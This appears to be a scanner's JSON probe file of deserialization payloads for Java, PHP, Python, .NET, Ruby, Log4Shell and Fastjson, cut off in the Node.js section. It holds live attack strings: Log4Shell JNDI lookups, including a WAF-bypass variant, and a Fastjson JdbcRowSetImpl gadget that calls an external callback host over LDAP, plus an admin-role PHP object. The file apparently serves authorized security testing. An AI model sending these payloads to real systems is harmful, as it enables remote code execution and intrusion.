{
  "category": "deserialization",
  "contexts": {
    "java": {
      "description": "Java deserialization attacks",
      "tech_match": ["Java", "Tomcat", "Spring", "JBoss", "WebLogic"],
      "param_match": ["data", "object", "payload", "token", "session", "viewstate"],
      "probes": [
        {
          "payload": "{{baseline}}",
          "description": "Java serialized object detection — look for magic bytes rO0AB or ACED0005 in base64",
          "matchers": [{"type": "regex", "pattern": "rO0AB|aced0005|java\\.io\\."}],
          "severity": "critical",
          "confidence_boost": 45
        },
        {
          "payload": "rO0ABXNyABFqYXZhLnV0aWwuSGFzaFNldA==",
          "description": "Java HashSet gadget chain (base64) — triggers deserialization; look for 500 error or timing anomaly indicating RCE attempt",
          "matchers": [{"type": "status", "status": [500]}, {"type": "word", "words": ["ObjectInputStream", "ClassNotFoundException", "deserialization"], "condition": "or"}],
          "severity": "critical",
          "confidence_boost": 40
        },
        {
          "payload": "{{baseline}}",
          "description": "ObjectInputStream error leak — check error messages for Java deserialization stack traces",
          "matchers": [{"type": "word", "words": ["ObjectInputStream", "ClassNotFoundException", "InvalidClassException", "StreamCorruptedException"], "condition": "or"}],
          "severity": "high",
          "confidence_boost": 35
        }
      ]
    },
    "php": {
      "description": "PHP deserialization attacks",
      "tech_match": ["PHP", "Laravel", "WordPress"],
      "param_match": ["data", "object", "payload", "token", "cookie"],
      "probes": [
        {
          "payload": "O:8:\"stdClass\":0:{}",
          "description": "PHP object deserialization probe",
          "matchers": [{"type": "not_word", "words": ["unserialize", "error", "invalid"]}, {"type": "status", "status": [200]}],
          "severity": "high",
          "confidence_boost": 35
        },
        {
          "payload": "a:1:{s:4:\"test\";s:4:\"test\";}",
          "description": "PHP array unserialization probe — accepted without error indicates unserialize() is called",
          "matchers": [{"type": "status", "status": [200]}, {"type": "not_word", "words": ["error", "invalid", "unserialize"]}],
          "severity": "high",
          "confidence_boost": 35
        },
        {
          "payload": "O:4:\"User\":1:{s:4:\"role\";s:5:\"admin\";}",
          "description": "PHP object with role=admin — check if privilege escalation via deserialization",
          "matchers": [{"type": "status", "status": [200]}, {"type": "not_word", "words": ["unauthorized", "forbidden", "invalid"]}],
          "severity": "critical",
          "confidence_boost": 45
        }
      ]
    },
    "python": {
      "description": "Python insecure deserialization detection",
      "tech_match": ["Python", "Flask", "Django"],
      "param_match": ["data", "object", "payload", "token"],
      "probes": [
        {
          "payload": "{{baseline}}",
          "description": "Insecure object deserialization — detect serialized object magic bytes in responses (gASV prefix = Python serialized object)",
          "matchers": [{"type": "regex", "pattern": "gASV|cosystem|\\\\x80\\\\x04"}],
          "severity": "critical",
          "confidence_boost": 40
        }
      ]
    },
    "dotnet_viewstate": {
      "description": ".NET ViewState deserialization",
      "tech_match": ["ASP.NET", "IIS"],
      "param_match": ["__VIEWSTATE", "viewstate"],
      "probes": [
        {
          "payload": "{{baseline}}",
          "description": "Check if ViewState MAC validation is disabled (exploitable for RCE)",
          "matchers": [{"type": "word", "words": ["__VIEWSTATE"], "condition": "or"}, {"type": "not_word", "words": ["__VIEWSTATEGENERATOR"]}],
          "severity": "high",
          "confidence_boost": 35
        }
      ]
    },
    "ruby": {
      "description": "Ruby Marshal.load deserialization attacks",
      "tech_match": ["Ruby", "Rails"],
      "param_match": ["data", "object", "payload", "session", "cookie"],
      "probes": [
        {
          "payload": "BAhvOghGb28GOg==",
          "description": "Ruby Marshal payload (base64) — look for 'marshal' in error messages or unexpected 500 indicating Ruby object deserialization",
          "matchers": [{"type": "regex", "pattern": "[Mm]arshal|TypeError.*no implicit conversion|ArgumentError.*marshal"}],
          "severity": "critical",
          "confidence_boost": 40
        }
      ]
    },
    "log4shell": {
      "description": "Log4Shell (CVE-2021-44228) \u2014 JNDI injection via Log4j lookups. Collaborator-based detection (checking interactions after sending probe) is strongly preferred over timing-only detection for reliable confirmation.",
      "tech_match": ["Java", "Tomcat", "Spring", "JBoss", "WebLogic", "Log4j"],
      "param_match": ["data", "object", "payload", "token", "session", "username", "email", "search", "q", "user-agent", "referer"],
      "probes": [
        {
          "payload": "${jndi:ldap://{{callback}}/a}",
          "description": "Log4Shell JNDI lookup \u2014 if Log4j processes this, it makes an outbound LDAP/DNS connection to the callback. Use Collaborator interactions as primary signal; header changes (Set-Cookie, error headers) or timing diff as secondary indicators.",
          "matchers": [
            {"type": "not_word", "words": ["${jndi:"]},
            {"type": "header_change"},
            {"type": "differential_timing", "min_diff_ms": 3000}
          ],
          "severity": "critical",
          "confidence_boost": 70
        },
        {
          "payload": "${${lower:j}ndi:${lower:l}dap://{{callback}}/a}",
          "description": "Log4Shell WAF bypass variant \u2014 nested lookups reconstruct 'jndi:ldap' at runtime, evading static keyword filters. Check Collaborator for DNS/LDAP interactions as primary detection method.",
          "matchers": [
            {"type": "not_word", "words": ["${jndi:", "${lower:"]},
            {"type": "header_change"},
            {"type": "differential_timing", "min_diff_ms": 3000}
          ],
          "severity": "critical",
          "confidence_boost": 70
        }
      ]
    },
    "fastjson": {
      "description": "Fastjson deserialization — @type auto-type feature enables RCE via JNDI or class instantiation gadgets",
      "tech_match": ["Java", "Spring", "FastJSON"],
      "param_match": ["data", "object", "payload", "json", "body", "request"],
      "probes": [
        {
          "payload": "{\"@type\":\"java.net.Inet4Address\",\"val\":\"{{callback}}\"}",
          "description": "Fastjson Inet4Address gadget — triggers DNS resolution to callback if auto-type is enabled, confirming deserialization",
          "matchers": [
            {"type": "timing", "min_ms": 5000},
            {"type": "status", "status": [200, 500]}
          ],
          "severity": "critical",
          "confidence_boost": 60
        },
        {
          "payload": "{\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"ldap://{{callback}}/Exploit\",\"autoCommit\":true}",
          "description": "Fastjson JdbcRowSetImpl JNDI gadget — triggers outbound LDAP connection via auto-type deserialization, enabling RCE",
          "matchers": [
            {"type": "timing", "min_ms": 5000},
            {"type": "status", "status": [200, 500]}
          ],
          "severity": "critical",
          "confidence_boost": 65
        }
      ]
    },
    "node_js": {
      "description": "Node.js insecure deserialization via node-serialize",
      "tech_match": ["Node.js", "Express"],
      "param_match": ["data", "object", "payload", "session", "cookie"],
